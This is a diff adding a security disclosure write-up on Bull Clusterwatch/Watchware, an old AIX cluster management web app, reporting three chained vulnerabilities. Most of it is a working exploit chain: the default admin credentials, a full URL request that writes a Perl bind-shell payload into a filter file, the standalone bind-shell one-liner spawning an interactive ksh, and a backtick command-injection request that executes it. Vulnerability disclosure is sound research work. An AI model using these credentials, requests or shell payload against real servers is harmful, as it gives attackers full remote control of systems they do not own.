@@ -1,0 +1,41 @@
+Bull Clusterwatch/Watchware is a VERY VERY OLD tool used by sysadmins to manage their AIX clusters.
+
+Marble effect in the web banner and questionable font: it smells the 90s !
+
+Tool is mainly a web app with CGIs (shell scripts and binaries) and we have found three vulnerabilities in it:
+
+Trivial admin credentials
+Authenticated user can write on the system file
+Authenticated user can inject OS commands
+By combining these three vulnerabilities an attacker can fully compromise servers running Watchware.
+
+We tried to contact Bull to report this more than one year ago without any success, but the devs are probably retired now so that doesn’t matter, let’s do some archeology alone.
+
+Here are the details:
+
+
+1. Trivial creds: smwadmin/bullsmw
+
+2. Authenticated user can write on the system file
+
+A page allows sysadmins to customize a few things including filters that are used in the process listing page (the tool allows you to list your running processes).
+
+But these filters are written on disk and you can call them using the following OS command injection.
+
+Request to write the shellcode:
+
+http://host:9696/clw/cgi-bin/adm/bclw_updatefile.cgi?cluster=clustername&node=nodename&alarm=%0D%0Aswap_adapter%0D%0Anode_down%0D%0Anode_up%0D%0Anetwork_down%0D%0Anetwork_up%0D%0Astate%0D%0Ahacmp%0D%0Astop%0D%0Aaix%0D%0A&day=1%0D%0A2%0D%0A3%0D%0A4%0D%0A5%0D%0A6%0D%0A7%0D%0A8%0D%0A15%0D%0A30%0D%0A45%0D%0A0%0D%0A&hour=0%0D%0A1%0D%0A2%0D%0A3%0D%0A4%0D%0A5%0D%0A6%0D%0A12%0D%0A18%0D%0A23%0D%0A&proc=perl%20-e%20'use%20Socket;$p=2222;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p,%20INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close%20C){open(STDIN,">%26C");open(STDOUT,">%26C");open(STDERR,">%26C");exec("/bin/ksh%20-i");};'%0D%0A%0D%0A&lpp=%0D%0Acluster%0D%0A&refr=0%0D%0A
+
+The shellcode we used:
+
+perl -e 'use Socket;$p=2223;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/ksh -i");};'
+
+3. Authenticated user can inject OS commands
+
+When listing the processes you can apply a filter… and inject a single command using backticks, great !
+
+Very useful to execute our shellcode which was stored in a single file (the filter).
+
+Request to execute the shellcode:
+
+http://host:9696/clw/cgi-bin/adm/bclw_stproc.cgi?cluster=clustername&node=nodename&proc_filter=smw`/usr/sbin/bullcluster/monitoring/clw/web/conf/proc_filter.txt`"
